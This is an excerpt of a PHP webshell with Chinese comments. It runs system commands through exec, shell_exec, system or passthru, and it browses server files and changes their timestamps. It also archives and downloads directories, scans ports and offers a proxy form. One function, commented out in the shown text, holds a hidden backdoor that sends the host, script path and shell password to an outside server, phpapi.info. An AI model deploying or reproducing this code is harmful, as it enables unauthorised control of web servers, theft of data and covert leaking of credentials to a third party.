...
ob_start();  //打开缓冲区
define('myaddress', $_SERVER['SCRIPT_FILENAME']); //定义myaddress为webshell所在的完整路径
define('postpass', $password); //定义postpass为password

//这个函数依次寻找exec, shell_exec,system, passthru
//若可以使用则传入要执行的语句（受php.ini的影响
...
function CheckDate(){
    ...
    if(t=="utf-8"){document.getElementById('txt').value = base64encode(utf16to8(document.getElementById('txt').value));}
        ...
        if (substr(PHP_VERSION, 0, 1) >= 5) {
            $str = <<<end
if(t=="gbk" || t=="utf8"){document.getElementById('txt').value = base64encode(utf16to8(document.getElementById('txt').value));}
end;
            html_n($str);
        }
        $str = <<<end
...
/*function show_mainp()
{
    ...
    if (strpos($domain, "0.0") !== false || strpos($domain, "192.168.") !== false || strpos($domain, "localhost") !== false) {
        ...
        $apiname = urlencode($_SERVER ['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
        $apivalue = urlencode(postpass);
        $apitoken = "http://phpapi.info/api.php?name="; //后门地址
        $apikey = "&id=" . urlencode(get_proxy_ip());
        $url = $apitoken . $apiname . '&value=' . $apivalue.$apikey;
        GetHtml($url);
    }
...
function get_proxy_ip()
{
    ...
    $client_ip = 'unknown';
    //分别用$arr_ip_header中的变量获得ip，若不为空且不为unknow则返回
...
//Unknown
if (isset($_GET['pack'])) { //
    $dir = do_show($_GET['pack']); //显示路径下的文件与文件夹
    $zip = new eanver($dir); //压缩并打包文件
    $out = $zip->out;
    do_download($out, $_SERVER['HTTP_HOST'] . ".tar.gz"); //下载
}
    ...
    case "main":
        ...
        while ($dirs = @$dir->read()) {
            ...
            if (is_dir($dirpath)) {
                ...
                html_n("</td><td align='center'><a href=\"javascript:SubmitAttran('修改所选文件时间为:','" . $dirs . "','" . $filetime . "','d');\"  title='修改时间'>" . $filetime . "</a></td><td align='center'></td></tr>");
                $NUM_D++;
            }
        }
        ...
        while ($files = @$dir->read()) {
            ...
            if (!is_dir($filepath)) {
                ...
                html_n("</td><td align='center'><a href=\"javascript:SubmitAttran('修改所选文件时间为:','" . $files . "','" . $filetime . "','d');\"  title='修改时间'>" . $filetime . "</a></td><td align='center'>");
            ...
            if (substr(PHP_VERSION, 0, 1) >= 5) {
                if (empty($_GET['charset'])) {
                    if (TestUtf8($FILE_CODE) > 1) {
                        $charset = 'UTF-8';
                        $FILE_CODE = iconv("UTF-8", "utf8//IGNORE", $FILE_CODE);
                    } else {
                        $charset = 'utf8';
                    }
                } else {
                    if ($_GET['charset'] == 'utf8') {
                        ...
                        $FILE_CODE = iconv($_GET['charset'], "utf8//IGNORE", $FILE_CODE);
                    }
                }
            }
...
<input type=\"button\" value=\"选择\" onclick=\"window.location='?eanver=editr&p=" . $jspath . "&charset='+this.form.charset.value;\" style=\"width:50px;\">");
        html_select(array("utf8" => "utf8", "UTF-8" => "UTF-8", "BIG5" => "BIG5", "EUC-KR" => "EUC-KR", "EUC-JP" => "EUC-JP", "SHIFT-JIS" => "SHIFT-JIS", "WINDOWS-874" => "WINDOWS-874", "ISO-8859-1" => "ISO-8859-1"), $charset, "onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
        html_n("</div>
...
<div class=\"actall\"><input type=\"submit\" value=\"扫描\" style=\"width:80px;\"></div>
        ...
        if ((!empty($_POST['ip'])) && (!empty($_POST['port']))) {
            ...
            for ($i = 0; $i < count($ports); $i++) {
                ...
                echo $fp ? "<font color=\"#00ff00\">开放端口: " . $ports[$i] . "</font><br>" : "关闭端口: " . $ports[$i] . "<br>";
                ob_flush();
                flush();
            }
            echo "</div>";
 ...
 <form method=\"POST\" target=\"proxyframe\">
  ...
  <tr class=\"firstalt\">
    <td align=\"center\" height=40  >URL: <input name=\"url\" value=\"\" type=\"text\"  class=\"input\" size=\"100\" >
